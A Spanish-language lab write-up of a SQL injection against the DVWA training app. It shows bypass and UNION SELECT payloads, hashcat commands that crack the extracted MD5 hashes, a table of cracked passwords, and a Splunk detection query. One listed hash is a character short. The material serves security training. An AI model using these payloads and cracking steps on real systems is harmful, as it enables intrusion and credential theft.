# SQL Injection contra DVWA 
## + Hashing y Crackeo de credenciales almacenadas.

Ataque en tres etapas contra el módulo SQL Injection de DVWA: bypass de la lógica de consulta, extracción de las credenciales almacenadas en la base de datos, y cracking de los hashes obtenidos.

## Setup — DVWA

- **DVWA Security:** Low
- **Módulo:** SQL Injection (`/dvwa/vulnerabilities/sqli/`)
- **Campo vulnerable:** User ID — consulta que busca un usuario por su ID sin sanitizar el input

---

## Etapa 1 — Confirmar el comportamiento normal

Se envía `1` en el campo User ID. La aplicación devuelve los datos de un único usuario (nombre, first/last name) — confirma cómo se comporta la consulta legítima antes de manipularla.

## Etapa 2 — Bypass de la lógica SQL

```
1' OR '1'='1
```

La condición `'1'='1'` es siempre verdadera, por lo que la consulta deja de filtrar por un ID específico y devuelve **todos** los usuarios de la tabla en vez de uno solo.

## Etapa 3 — Extracción de credenciales con UNION SELECT

```
' UNION SELECT user, password FROM users-- -
```

`UNION SELECT` combina la consulta original con una nueva que pide explícitamente las columnas `user` y `password` de la tabla `users`. Resultado: se obtuvieron los 4 usuarios de DVWA junto con sus contraseñas almacenadas como hashes MD5 (no cifradas — un hash es irreversible por diseño, a diferencia del cifrado).

---

## Etapa 4 — Cracking de los hashes obtenidos

### Guardar los hashes extraídos (en Kali)

```bash
nano /tmp/hashes_dvwa.txt
```

### Instalación de herramientas necesarias

```bash
sudo apt install -y hashcat
sudo apt install -y ocl-icd-libopencl1 pocl-opencl-icd   # requerido para que hashcat corra sin GPU dedicada
```

### Comando de cracking

```bash
hashcat -m 0 -a 0 -D 1 /tmp/hashes_dvwa.txt /usr/share/wordlists/rockyou.txt
```
- `-m 0` → tipo de hash MD5
- `-a 0` → ataque por diccionario
- `-D 1` → fuerza el uso de CPU en vez de GPU (necesario al correr en una VM sin GPU dedicada)

### Resultado — 4/4 hashes crackeados (100%)

| Usuario (por hash) | Hash MD5 | Contraseña crackeada |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `0d107d09f5bbe40cade3de5c71e9db7` | `letmein` |
| pablo | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |


---

## Detección en Splunk


**Query de detección:**

```spl
index=main sourcetype=access_combined uri="*sqli*" clientip=192.168.0.36
| table _time, method, uri, status
| sort _time
```

El payload SQL queda visible directamente en la URL, codificado (`%27` = `'`, `%3D` = `=`) — una firma reconocible: presencia de comillas simples, palabras clave SQL (`OR`, `UNION`, `SELECT`) y guiones dobles (`-- -`) dentro del parámetro `id`.

---

## Resumen

| Campo | Valor |
|---|---|
| Vulnerabilidad | SQL Injection (input sin sanitizar en parámetro `id`) |
| Técnica | Bypass de lógica (`OR '1'='1`) + extracción con `UNION SELECT` |
| Datos comprometidos | 4 pares usuario/contraseña de la tabla `users` |
| Algoritmo de hash | MD5, sin salt |
| Herramienta de cracking | hashcat (modo CPU) |
| Resultado del cracking | 4/4 contraseñas recuperadas (100%) |
| Severidad | Alta — compromiso total de credenciales de la aplicación |

## Interpretación

Este ataque muestra el ciclo completo de un compromiso de credenciales vía aplicación web: una vulnerabilidad de validación de input (SQLi) no solo permite ver datos que no deberían ser accesibles, sino que puede escalar directamente a **robo total de la base de usuarios**. El uso de MD5 sin salt (cadena de datos aleatoria para dificultar el crackeo) como algoritmo de hash agrava el impacto — es un algoritmo rápido de crackear por fuerza bruta/diccionario, a diferencia de algoritmos diseñados para almacenamiento de contraseñas (bcrypt, argon2), que son deliberadamente lentos para dificultar este mismo ataque.
